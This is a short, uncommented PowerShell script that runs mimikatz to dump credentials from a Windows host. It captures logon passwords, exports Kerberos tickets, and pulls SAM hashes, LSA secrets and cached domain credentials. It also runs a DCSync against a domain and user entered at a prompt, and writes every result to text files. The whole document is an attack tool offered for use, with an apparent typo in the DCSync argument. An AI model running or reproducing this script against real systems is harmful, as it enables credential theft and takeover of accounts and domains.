$sekurlsaDirectory = "./sekurlsa"
$lsadumpDirectory = "./lsadump"

if (!(Test-Path -Path $sekurlsaDirectory -PathType Container)) {
  New-Item -ItemType Directory -Path $sekurlsaDirectory
}

New-Item -ItemType File -Path ".\logonpasswords.txt" -Force
New-Item -ItemType File -Path ".\logonPasswordsfull.txt" -Force
New-Item -ItemType File -Path ".\tickets_export.txt" -Force

$logonpasswords = Join-Path $sekurlsaDirectory "logonpasswords.txt"
& .\mimikatz.exe "sekurlsa::logonpasswords" > $logonpasswords

$logonPasswordsfull = Join-Path $sekurlsaDirectory "logonPasswordsfull.txt"
& .\mimikatz.exe "sekurlsa::logonPasswords full" > $logonPasswordsfull

$tickets_export = Join-Path $sekurlsaDirectory "tickets_export.txt"
& .\mimikatz.exe "sekurlsa::tickets /export" > $tickets_export

$domain = Read-Host -Prompt "Enter the domain (e.g. chocolate.local): "
$user = Read-Host -Prompt "Enter the username (e.g. Administrateur): "

if (!(Test-Path -Path $lsadumpDirectory -PathType Container)) {
  New-Item -ItemType Directory -Path $lsadumpDirectory
}

$dumpsam = Join-Path $lsadumpDirectory "sam.txt"
& .\mimikatz.exe "lsadump::sam" > $dumpsam

$dumpsecrets = Join-Path $lsadumpDirectory "secrets.txt"
& .\mimikatz.exe "lsadump::secrets" > $dumpsecrets

$dumpcach = Join-Path $lsadumpDirectory "cache.txt"
& .\mimikatz.exe "lsadump::cache" > $dumpcach

$dumpdcsync = Join-Path $lsadumpDirectory "dcsync.txt"
& .\mimikatz.exe "lsadump::dcsync /user::$user /domain:$domain" > $dumpdcsync